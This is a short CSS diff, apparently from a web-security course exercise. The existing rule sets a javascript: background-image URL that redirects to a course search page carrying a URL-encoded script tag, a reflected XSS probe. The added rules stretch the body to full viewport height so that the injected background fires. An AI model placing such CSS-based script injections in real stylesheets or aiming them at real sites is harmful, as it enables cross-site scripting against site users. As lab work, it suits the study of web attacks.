@@ -2,3 +2,9 @@
 body {
     background-image: url("javascript:window.location='https://cs6262.gtisc.gatech.edu/search?keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E';"); 
 }
+
+/* Ensure the body is displayed to make the background image active */
+body {
+    height: 100vh; /* Ensuring the body takes full viewport height */
+    background-size: cover; /* Cover the entire body */
+}
